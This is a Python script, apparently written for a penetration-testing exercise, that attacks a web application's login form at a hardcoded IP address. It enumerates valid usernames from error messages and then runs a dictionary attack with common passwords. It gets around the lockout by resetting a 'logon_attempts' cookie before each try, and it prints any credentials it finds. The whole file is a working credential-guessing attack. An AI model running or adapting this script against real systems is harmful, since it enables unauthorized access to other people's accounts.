import requests
from bs4 import BeautifulSoup

users = ["shop","admin1","pentest","pablo","christian","maria","shopowner1", "shopowner2", "shopowner3"]
valid_users = []
passwords = ["abc123", "admin123", "123456", "1qazxsw2","1234qwer", "qwerasdf","abcd1234", "test123","test321"]
url = 'http://143.244.160.79/fvapp/fvapp/login'
proxy = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarybOpD8uAhxlNtiuYA'

}
# Get the initial HTML page and parse it
response = requests.get(url, proxies=proxy, headers=headers)
soup = BeautifulSoup(response.content, 'html.parser')

#username = "shopowner1"
password = "password"

#Loop to check for valid / existing usernames from the list based on the response ("Invalid username")
invalid_msg = "Invalid user"
for username in users:
    # Extract the names for the input fields used for username and password, and the cookies to be used in the authentication request
    # find the input element with the type 'text' (username)
    username_input = soup.find('input', {'type': 'text'})
    username_input_name = username_input['name']
    # find the input element with the type 'password'
    password_input = soup.find('input', {'type': 'password'})
    password_input_name = password_input['name']
    # use the extracted input names values to send the new authentication request
    cookies = response.cookies
    cookie_sessionid = cookies.get('session_id_fvapp')
    #print(username_input_name)
    #print(password_input_name)
    #print(cookie_sessionid)
    # Prepare the data to be sent in the POST request with the gathered values and the user/password in the loop
    data = "------WebKitFormBoundarybOpD8uAhxlNtiuYA\nContent-Disposition: form-data; name=\""+username_input_name+"\"\n\n"+username
    data = data + "\n------WebKitFormBoundarybOpD8uAhxlNtiuYA\nContent-Disposition: form-data; name=\""+password_input_name+"\"\n\n"+password
    data = data + "\n------WebKitFormBoundarybOpD8uAhxlNtiuYA\nContent-Disposition: form-data; name=\"_formname\"\n\nno_table/create\n------WebKitFormBoundarybOpD8uAhxlNtiuYA--"
    # Send the POST request with the cookie
    response = requests.post(url, data=data, cookies=cookies, proxies=proxy, headers=headers, allow_redirects=False)
    soup = BeautifulSoup(response.content, 'html.parser')
    if invalid_msg in response.text:
        print("User doesn't exist: "+username)
    else:
        print("USERNAME FOUND: "+username)
        valid_users.append(username)

#Complete a dictionary attack for all the users found
print("Valid users found: ",valid_users)
for username in valid_users:
    # Get the initial HTML page and parse it
    response = requests.get(url, proxies=proxy, headers=headers)
    soup = BeautifulSoup(response.content, 'html.parser')
    for password in passwords:
        # Extract the names for the input fields used for username and password, and the cookies to be used in the authentication request
        # find the input element with the type 'text' (username)
        username_input = soup.find('input', {'type': 'text'})
        username_input_name = username_input['name']
        # find the input element with the type 'password'
        password_input = soup.find('input', {'type': 'password'})
        password_input_name = password_input['name']
        # use the extracted input names values to send the new authentication request
        cookies = response.cookies
        #cookie_sessionid = cookies.get('session_id_fvapp')
        cookies['logon_attempts'] = '0'
        #print(username_input_name)
        #print(password_input_name)
        #print(cookie_sessionid)
        # Prepare the data to be sent in the POST request with the gathered values and the user/password in the loop
        data = "------WebKitFormBoundarybOpD8uAhxlNtiuYA\nContent-Disposition: form-data; name=\""+username_input_name+"\"\n\n"+username
        data = data + "\n------WebKitFormBoundarybOpD8uAhxlNtiuYA\nContent-Disposition: form-data; name=\""+password_input_name+"\"\n\n"+password
        data = data + "\n------WebKitFormBoundarybOpD8uAhxlNtiuYA\nContent-Disposition: form-data; name=\"_formname\"\n\nno_table/create\n------WebKitFormBoundarybOpD8uAhxlNtiuYA--"
        # Send the POST request with the cookie
        response = requests.post(url, data=data, cookies=cookies, proxies=proxy, headers=headers, allow_redirects=False)
        soup = BeautifulSoup(response.content, 'html.parser')
        #Si la respuesta es un redirect, las credenciales estaban OK
        if response.is_redirect:
            print("PASSWORD FOUND FOR USER: "+username+" is: "+password)
            break
        else:
            print ("Invalid credentials: "+username+":"+password)
